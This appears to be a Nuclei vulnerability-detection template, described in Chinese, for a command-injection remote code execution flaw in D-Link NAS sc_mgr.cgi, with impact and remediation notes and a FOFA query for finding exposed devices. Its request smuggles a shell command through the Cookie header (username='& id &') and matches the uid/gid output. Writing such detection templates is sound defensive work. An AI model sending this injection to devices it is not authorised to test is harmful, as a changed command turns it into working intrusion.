id: dlink-nas-rce

info:
  name: D-Link NAS `sc_mgr.cgi` - 远程代码执行漏洞
  author: adeljck
  severity: critical
  description: |
    该模板用于检测 D-Link NAS `sc_mgr.cgi` - 远程代码执行漏洞。该类漏洞通常允许攻击者通过可控参数、接口调用或危险功能在目标服务端执行命令或代码。模板主要向 `/cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info` 等路径发送探测请求，并根据响应中的 `uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)`、`404 not found` 等特征确认漏洞是否存在。
  impact: |
    - 攻击者可在目标服务权限下执行系统命令或应用代码，读取、修改业务数据并部署持久化后门。
    - 若服务运行在高权限账户或可访问内网资源，漏洞可能进一步导致主机失陷和横向移动。
  remediation: |
    - 升级受影响产品到厂商修复版本，或应用官方补丁/安全配置基线。
    - 限制相关管理接口、调试接口或危险功能的访问来源，避免直接暴露到公网。
    - 排查异常进程、计划任务、WebShell、新增账号和外联记录，并轮换可能泄露的密钥与凭据。
  classification:
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 1
    fofa-query: 'body="/cgi-bin/login_mgr.cgi" && body="cmd=cgi_get_ssl_info"'
  tags: dlink,nas,rce,vuln

http:
  - raw:
      - |
        GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1
        Host: {{Hostname}}
        Cookie: username='& id &';

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)"
          - "404 not found"
        condition: and

      - type: status
        status:
          - 200
